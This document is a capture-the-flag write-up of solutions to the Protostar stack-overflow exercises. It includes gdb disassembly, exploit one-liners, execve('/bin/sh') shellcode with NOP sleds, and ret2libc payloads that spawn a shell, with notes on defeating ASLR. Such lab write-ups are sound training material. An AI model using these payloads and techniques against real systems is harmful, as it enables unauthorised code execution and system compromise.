# the solutions of protostar

## table of content

- [the solutions of protostar](#the-solutions-of-protostar)
  - [table of content](#table-of-content)
  - [stack0](#stack0)
    - [stack0 solution](#stack0-solution)
  - [stack1](#stack1)
    - [stack1 solution](#stack1-solution)
  - [stack2](#stack2)
    - [stack2 solution](#stack2-solution)
  - [stack3: python3 encoding(bad characters)](#stack3-python3-encodingbad-characters)
    - [stack3 solution](#stack3-solution)
  - [stack4: modify EIP](#stack4-modify-eip)
    - [stack4 solution](#stack4-solution)
  - [stack5: jmp esp](#stack5-jmp-esp)
    - [stack5 solution](#stack5-solution)
  - [stack6: compile time return address check, forbid returning to stack. RoP gadget (Return to .text section)](#stack6-compile-time-return-address-check-forbid-returning-to-stack-rop-gadget-return-to-text-section)
    - [stack6 solution](#stack6-solution)
  - [stack7: ret2libc](#stack7-ret2libc)
    - [ret2Libc](#ret2libc)
    - [ret2Libc advanced](#ret2libc-advanced)

## stack0

```asm
(gdb)disassemble
Dump of assembler code for function main:
=> 0x080483f4 <+0>:     push   ebp
   0x080483f5 <+1>:     mov    ebp,esp
   0x080483f7 <+3>:     and    esp,0xfffffff0
   0x080483fa <+6>:     sub    esp,0x60                    # allocating space. char buffer[64]
   0x080483fd <+9>:     mov    DWORD PTR [esp+0x5c],0x0    # volatile int modified
   0x08048405 <+17>:    lea    eax,[esp+0x1c]
   0x08048409 <+21>:    mov    DWORD PTR [esp],eax
   0x0804840c <+24>:    call   0x804830c <gets@plt>
   0x08048411 <+29>:    mov    eax,DWORD PTR [esp+0x5c]
   0x08048415 <+33>:    test   eax,eax
   0x08048417 <+35>:    je     0x8048427 <main+51>
   0x08048419 <+37>:    mov    DWORD PTR [esp],0x8048500
   0x08048420 <+44>:    call   0x804832c <puts@plt>
   0x08048425 <+49>:    jmp    0x8048433 <main+63>
   0x08048427 <+51>:    mov    DWORD PTR [esp],0x8048529
   0x0804842e <+58>:    call   0x804832c <puts@plt>
   0x08048433 <+63>:    leave
   0x08048434 <+64>:    ret
```

- `[esp+0x1c]`: the variable
- `[esp+0x5c]`: the stack buffer

- when input length > buffer.size, the bottom of the stack (ebp) gets overwrited

- **Think about the pointer. `buffer[65]` points to a higher address than `buffer[0]`.**
- The actual memory location of the `buffer` could be printed using `printf("%p\n", (void *) buffer)`, or `$esp+0x1c` @ `*main + 17`.
- Hence when the buffer overflows, the variable stored at `[esp+0x5c]` @ `*main + 9`, which is higher than the aforementioned `buffer`, will be overwritten eventually.

### stack0 solution

```sh
python3 -c "print('A' * 80)" | ./stack0
```

## stack1

```asm
   0x080484ab <+71>:    cmp    eax,0x61626364
```

```gdb
r $(python3 -c 'print("A" * 64 + "BCDEFGHIJKLMNOPQRSTUVWXYZ")')
r $(python3 -c "print(b'A' * 64 + b'\x42\x43\x44\x45')")
  # the "b'" occupies 2 bytes
b *main + 71
info registers    # eax 0x45444342 
```

### stack1 solution

```sh
# ./stack1 $(python3 -c "print(b'A' * 62 + b'\x64\x63\x62\x61')")
./stack1 $(python3 -c "print('A' * 64 + '\x64\x63\x62\x61')")
```

## stack2

```gdb
b *main+84
```

### stack2 solution

```sh
GREENIE=$(python3 -c "print('A' * 64 + '\x0a\x0d\x0a\x0d')");export GREENIE;printenv GREENIE;
  # if use b'', the \x0a will be literally parsed as '\' 'x' '0' 'a'
./stack2
```

## stack3: python3 encoding(bad characters)

```asm
  0x08048475 <+61>:    call   eax 
```

- find out the target binary

```sh
objdump -d stack3 | grep win
  # @ 0x08 04 84 24 
```

- redirect the `fp();` call. Problem: bad chars

```gdb
b *main + 61
r <<< $(python3 -c "print('A' * 120)")
r <<< $(python3 -c "print('A' * 64 + '\x24\x84\x04\x08')")
  # bad chars. The '\x84' get parsed as '\xc2\x84' in python3. Possible UTF-8 <control> string.
  # solution: use echo -e -n
```

### stack3 solution

```sh
./stack3 <<< $(python3 -c "print('A' * 64)"|xargs echo -en;echo -en '\x24\x84\x04\x08')
```

## stack4: modify EIP

```asm
(gdb) disassemble main
Dump of assembler code for function main:
  0x08048408 <+0>:     push   ebp
  0x08048409 <+1>:     mov    ebp,esp
  0x0804840b <+3>:     and    esp,0xfffffff0                  # padding, esp <- ebp-0xb
  0x0804840e <+6>:     sub    esp,0x50
  0x08048411 <+9>:     lea    eax,[esp+0x10]
  0x08048415 <+13>:    mov    DWORD PTR [esp],eax
  0x08048418 <+16>:    call   0x804830c <gets@plt>
  0x0804841d <+21>:    leave
  0x0804841e <+22>:    ret
End of assembler dump. 
```

```sh
objdump -d ./stack4
  # 080483f4
```

```gdb
b *main + 22
r <<< $(python3 -c "print('A' * 120)")
r <<< $(python3 -c "print('A' * (64 + int(0xb + 0x4)))"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
```

### stack4 solution

```sh
./stack4 <<< $(python3 -c "print('A' * (64 + int(0xb + 0x1)))"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
```

## stack5: jmp esp

```asm
(gdb) disassemble main
Dump of assembler code for function main:
  0x080483c4 <+0>:     push   ebp
  0x080483c5 <+1>:     mov    ebp,esp
  0x080483c7 <+3>:     and    esp,0xfffffff0
  0x080483ca <+6>:     sub    esp,0x50
  0x080483cd <+9>:     lea    eax,[esp+0x10]
  0x080483d1 <+13>:    mov    DWORD PTR [esp],eax
  0x080483d4 <+16>:    call   0x80482e8 <gets@plt>
  0x080483d9 <+21>:    leave
  0x080483da <+22>:    ret
End of assembler dump.
```

- info:
  + `leave` === `# mov esp, ebp -> pop ebp`. The `pop ebp` means esp += 4
  + `ret` esp += 4 again, and `eip <- [esp]`, which is the so-called `JMP esp`

```gdb
b *main + 21
info proc mappings
   # start      end           size        offset objfile
   # 0xffbf2000 0xffc13000    0x21000        0x0 [stack]
./stack5 <<< $(python3 -c "print('A' * (64 + int(0xb + 0x1)))"|xargs echo -en;echo -en '\xf4\x83\x04\x08')

   # objdump -d ./stack5
   # 080483c4 <main>

   # leave                  esp=0xfff34180 ebp=0xfff341d8 -> esp=0xfff341dc
     # (gdb) x/4wx $esp
     # 0xfff341dc:     0xf7d0ff21      0x00000001      0xfff34274      0xfff3427c 
   # ret
     # eip=0xf7d0ff21
r <<< $(python3 -c "print('A' * 76 )"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
```

### stack5 solution

```sh
./stack5 <<< $(python3 -c "print('A' * 76 )"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
```

- A problem: to `jmp esp`, `ebp` must be overwritten (modern system stack cookie)

## stack6: compile time return address check, forbid returning to stack. RoP gadget (Return to .text section)

```sh
./stack6 <<< $(python3 -c "print('A' * 120 )")
  # SIGSEGV
objdump -d stack6
  # getpath()

b *getpath + 57
b *getpath + 116

# smashing the stack -> padding=80
# targetAddr -> p system 0xf7e272e0
# rtnAddr -> 'AAAA'
# find 0xf7da0000, 0xffffffff, "/bin/sh" -> 0xf7f1e0af
# param -> '/bin/sh': 0xf7f1e0af

r <<< $(python3 -c "print('A' * 80 )"|xargs echo -en;echo -en '\xe0\x72\xe2\xf7AAAA\xaf\xe0\xf1\xf7')
./stack6 <<< $(python3 -c "print('A' * 80 )"|xargs echo -en;echo -en '\xe0\x72\xe2\xf7AAAA\xaf\xe0\xf1\xf7')

# however __libc change location on each load. Try another method.
```

- `jmp esp` to the .text `ret`, then `jmp esp` again ho bypass the compiler check.

```sh
r <<< $(python3 -c "print('\x90' * (80-19) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80')"|xargs echo -en;echo -en '\xf9\x84\x04\x08\x10\x69\xa8\xff')
r <<< $(python3 -c "print('\x90' * (80-19) + '')"|xargs echo -en;echo -en '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80';echo -en '\xf9\x84\x04\x08\x10\x69\xa8\xff');
  # $(python3 -c "import sys;sys.stdout.buffer.write(b'\x90')")

  # For the exam, use the clear-text payload.
python3 -c "import struct;padding=(b'\x90'*80);ret=struct.pack('I', 0x080484f9);eip = struct.pack('I', 0xbffff7c0);pl=b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80';print(padding+ret+eip+pl);"
  # in 64 bit use struct.pack('Q', address), will parse the address in the right order (LE/BE) depends on the system.
  # copy the result into $(echo -en 'content')
r <<< $(echo -en '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xf9\x84\x04\x08\xc0\xf7\xff\xbf1\xc0Ph//shh/bin\x87\xe3\xb0\x0b\xcd\x80');
  # If without ASLR, breakpoint at *ret, the stack address stays constant. 

  # an alternative
padding=$(for i in {0..61};do echo -en '\x90';done;)
ret0=$(echo -en '\x7c\xff\xff\x0b';)
ret1=$(echo -en '\x80\xff\xff\x0b';) # or not \x80 but (\x80 + <anyInt * 4>), then use NOP sled.
payload=$(echo -en '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80')
./stack6 <<< $(echo -en $padding; echo -en $ret0; echo -en $ret1; echo $payload)
```

### stack6 solution

```sh
  # Simulate no ASLR.
  # set breakpoint at *ret, the 1st address will be the constant `ret` address.
  # The second time stop at *ret, `set {int} $esp = $esp + 4` `set {int} ($esp+4) = 0xcccccccc`
  # int3 HIT
```

## stack7: ret2libc

### ret2Libc

- img:
  ![ret2Libc_visual](./img/ret2Libc_visual.jpg)
  ref:(<https://bufferoverflows.net/ret2libc-exploitation-example/>)

- Background: a common call push the param, push rtn address then jmp. (callee push ebp...)

```asm
  0x08048415 <+13>:    mov    DWORD PTR [esp],eax
  0x08048418 <+16>:    call   0x804830c <gets@plt>
```

- Background: stack before a normal `call` `jmp`

```asm
  0x00000000
  ...
  <param>
  <returnAddressAfterTheCall>
  <callee>
  ...
  0xffffffff
```

- Summary: Overwrite the `<callee>` address, and pretend to be a normal call. Basic structure:

```sh
  # payload = padding + libc_func_addr + ret_addr(could be used to chain exec) + func_param0 + func_param1
r <<< $(python3 -c "print('A' * 80 )"|xargs echo -en;echo -en '\xe0\x72\xe2\xf7AAAA\xaf\xe0\xf1\xf7')
```

- find the `<callee>` function, from __libc

```gdb
b *main + 62
r
info proc mappings
p system
  # $1 = {int (const char *)} 0x7ffff7e12410 <__libc_system>
x/s 0x7ffff7e12410
p /a 0x7ffff7e12410
  # print as address
```

- find the `<param>` string in __libc, e.g. `"/bin/sh"`

```gdb
find 0x7ffff7dbd000, 0x7fffffffffff, "/bin/sh"
  # 0x7ffff7f745aa
  #!? p /s 0x7ffff7f745aa
x/s 0x7ffff7f745aa
  # "/bin/sh"
```

- parse the payload

### ret2Libc advanced

- Even when `__libc` change its location on each execution, the relative address offset among __libc functions may remain the same.

- Hence if the address of a `__libc` function could be leaked at run time, the ret2Libc would be possible, because the desired function address could be calculated with the offset.

- Note that the offset should be calculated in the target machine.
